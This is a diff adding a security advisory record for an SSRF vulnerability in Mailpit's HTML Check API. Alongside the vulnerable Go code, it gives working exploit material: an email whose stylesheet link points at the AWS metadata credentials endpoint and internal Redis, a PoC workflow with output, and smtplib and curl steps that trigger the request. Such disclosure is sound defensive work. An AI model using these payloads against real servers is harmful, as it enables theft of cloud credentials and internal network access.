@@ -1,0 +1,57 @@
+{
+  "id": "GHSA-6jxm-fv7w-rw5j",
+  "modified": "2026-01-21T01:23:25.719911Z",
+  "published": "2026-01-21T01:01:26Z",
+  "aliases": [
+    "CVE-2026-23845"
+  ],
+  "summary": "Mailpit has a Server-Side Request Forgery (SSRF) via HTML Check API",
+  "details": "### Server-Side Request Forgery (SSRF) via HTML Check CSS Download\n\nThe HTML Check feature (`/api/v1/message/{ID}/html-check`) is designed to analyze HTML emails for compatibility. During this process, the `inlineRemoteCSS()` function automatically downloads CSS files from external `\u003clink rel=\"stylesheet\" href=\"...\"\u003e` tags to inline them for testing. \n\n\n#### Affected Components\n\n- **Primary File:** `internal/htmlcheck/css.go` (lines 132-207)\n- **API Endpoint:** `/api/v1/message/{ID}/html-check`\n- **Handler:** `server/apiv1/other.go` (lines 38-75)\n- **Vulnerable Functions:**\n  - `inlineRemoteCSS()` - line 132\n  - `downloadToBytes()` - line 193\n  - `isURL()` - line 221\n\n#### Technical Details\n\n**1. Insufficient URL Validation (`isURL()` function):**\n\n```go\n// internal/htmlcheck/css.go:221-224\nfunc isURL(str string) bool {\n    u, err := url.Parse(str)\n    return err == nil \u0026\u0026 (u.Scheme == \"http\" || u.Scheme == \"https\") \u0026\u0026 u.Host != \"\"\n}\n```\n\n\n**2. Unrestricted Download (`downloadToBytes()` function):**\n\n```go\n// internal/htmlcheck/css.go:193-207\nfunc downloadToBytes(url string) ([]byte, error) {\n    client := http.Client{\n        Timeout: 5 * time.Second,\n    }\n\n    // Get the link response data\n    resp, err := client.Get(url)  // ⚠️ VULNERABLE - No IP validation\n    if err != nil {\n        return nil, err\n    }\n    defer func() { _ = resp.Body.Close() }()\n\n    if resp.StatusCode != 200 {\n        err := fmt.Errorf(\"error downloading %s\", url)\n        return nil, err\n    }\n\n    body, err := io.ReadAll(resp.Body)  // ⚠️ Downloads ENTIRE response\n    if err != nil {\n        return nil, err\n    }\n\n    return body, nil\n}\n```\n\n**3. Automatic CSS Processing:**\n\n```go\n// internal/htmlcheck/css.go:132-187\nfunc inlineRemoteCSS(h string) (string, error) {\n    reader := strings.NewReader(h)\n    doc, err := goquery.NewDocumentFromReader(reader)\n    if err != nil {\n        return h, err\n    }\n\n    remoteCSS := doc.Find(\"link[rel=\\\"stylesheet\\\"]\").Nodes\n    for _, link := range remoteCSS {\n        attributes := link.Attr\n        for _, a := range attributes {\n            if a.Key == \"href\" {\n                if !isURL(a.Val) {  // ⚠️ Insufficient validation\n                    continue\n                }\n\n                if config.BlockRemoteCSSAndFonts {\n                    logger.Log().Debugf(\"[html-check] skip testing remote CSS content: %s (--block-remote-css-and-fonts)\", a.Val)\n                    return h, nil\n                }\n\n                resp, err := downloadToBytes(a.Val)  // ⚠️ Downloads from ANY URL\n                if err != nil {\n                    logger.Log().Warnf(\"[html-check] failed to download %s\", a.Val)\n                    continue\n                }\n\n                // Inlines the downloaded CSS\n                styleBlock := \u0026html.Node{\n                    Type:     html.ElementNode,\n                    Data:     \"style\",\n                    DataAtom: atom.Style,\n                }\n                styleBlock.AppendChild(\u0026html.Node{\n                    Type: html.TextNode,\n                    Data: string(resp),  // Downloaded content inserted\n                })\n                link.Parent.AppendChild(styleBlock)\n            }\n        }\n    }\n    \n    return doc.Html()\n}\n```\n\n\n#### Attack Vectors\n\n**Attack Vector 1: Cloud Metadata Credential Theft**\n\nAttacker sends HTML email with:\n```html\n\u003c!DOCTYPE html\u003e\n\u003chtml\u003e\n\u003chead\u003e\n    \u003clink rel=\"stylesheet\" href=\"http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role\"\u003e\n\u003c/head\u003e\n\u003cbody\u003eLegitimate email content\u003c/body\u003e\n\u003c/html\u003e\n```\n\nWhen HTML check is triggered:\n1. Mailpit makes GET request to AWS metadata endpoint\n2. Downloads IAM credentials as \"CSS content\"\n3. Credentials logged or potentially leaked via error messages\n\n\n\n#### Proof of Concept\n\nA complete working exploit is provided in `ssrf_htmlcheck_poc.py`.\n\n**PoC Usage:**\n\n```bash\n# Ensure Mailpit is running\n# SMTP: localhost:1025\n# HTTP API: localhost:8025\n\n# Run the exploit\npython3 ssrf_htmlcheck_poc.py\n```\n\n**PoC Workflow:**\n\n1. **Starts SSRF listener** on port 8888 to detect callbacks\n2. **Sends malicious HTML emails** containing:\n   ```html\n   \u003clink rel=\"stylesheet\" href=\"http://localhost:8888/malicious.css\"\u003e\n   \u003clink rel=\"stylesheet\" href=\"http://169.254.169.254/latest/meta-data/\"\u003e\n   \u003clink rel=\"stylesheet\" href=\"http://127.0.0.1:6379/\"\u003e\n   ```\n3. **Triggers HTML check** via API: `GET /api/v1/message/{ID}/html-check`\n4. **Monitors callbacks** and analyzes responses\n5. **Demonstrates exploitation** of:\n   - Local listener (proves SSRF)\n   - Cloud metadata endpoints\n   - Internal services (Redis, etc.)\n   - Private network ranges\n\n**Expected Output:**\n\n```\n╔══════════════════════════════════════════════════════════════════════════════╗\n║  Mailpit SSRF PoC - HTML Check CSS Download Vulnerability                   ║\n║  Severity: MODERATE                                                              ║\n║  File: internal/htmlcheck/css.go:193-207                                    ║\n╚══════════════════════════════════════════════════════════════════════════════╝\n\n[+] SSRF listener started on port 8888\n[*] Testing SSRF with callback to local listener...\n\n================================================================================\n[*] Testing SSRF with target: http://localhost:8888/malicious.css\n================================================================================\n[+] Email sent with CSS link to: http://localhost:8888/malicious.css\n[+] Message ID: abc123xyz\n[*] Triggering HTML check: http://localhost:8025/api/v1/message/abc123xyz/html-check\n[+] HTML check completed (Status: 200)\n\n[SSRF-LISTENER] 127.0.0.1 - \"GET /malicious.css HTTP/1.1\" 200 -\n\n[+] SUCCESS! SSRF confirmed - Received 1 callback(s):\n    Path: /malicious.css\n    User-Agent: Mailpit/dev\n\n================================================================================\n[*] Testing SSRF against internal/private targets...\n================================================================================\n\n⚠️  Note: These may timeout or fail, but Mailpit WILL attempt the connection\n\n[+] Email sent with CSS link to: http://127.0.0.1:6379/\n[+] Message ID: def456uvw\n[*] Triggering HTML check: http://localhost:8025/api/v1/message/def456uvw/html-check\n[!] Request timed out - target may be blocking or slow\n```\n\n**Manual Testing:**\n\n```bash\n# 1. Send malicious email\ncat \u003c\u003c 'EOF' | python3 - \u003c\u003cSENDMAIL\nimport smtplib\nfrom email.mime.text import MIMEText\n\nhtml = '''\n\u003c!DOCTYPE html\u003e\n\u003chtml\u003e\n\u003chead\u003e\n    \u003clink rel=\"stylesheet\" href=\"http://169.254.169.254/latest/meta-data/\"\u003e\n\u003c/head\u003e\n\u003cbody\u003eTest\u003c/body\u003e\n\u003c/html\u003e\n'''\n\nmsg = MIMEText(html, 'html')\nmsg['Subject'] = 'SSRF Test'\nmsg['From'] = 'test@test.com'\nmsg['To'] = 'victim@test.com'\n\nwith smtplib.SMTP('localhost', 1025) as smtp:\n    smtp.send_message(msg)\nSENDMAIL\nEOF\n\n# 2. Get message ID\nMESSAGE_ID=$(curl -s http://localhost:8025/api/v1/messages?limit=1 | jq -r '.messages[0].ID')\n\n# 3. Trigger SSRF\ncurl -v \"http://localhost:8025/api/v1/message/$MESSAGE_ID/html-check\"",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/axllent/mailpit",
+        "purl": "pkg:golang/github.com/axllent/mailpit"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "1.28.3"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/01/GHSA-6jxm-fv7w-rw5j/GHSA-6jxm-fv7w-rw5j.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/axllent/mailpit/security/advisories/GHSA-6jxm-fv7w-rw5j"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-23845"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/axllent/mailpit/commit/1679a0aba592ebc8487a996d37fea8318c984dfe"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/axllent/mailpit"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/axllent/mailpit/releases/tag/v1.28.3"
+    }
+  ]
+}
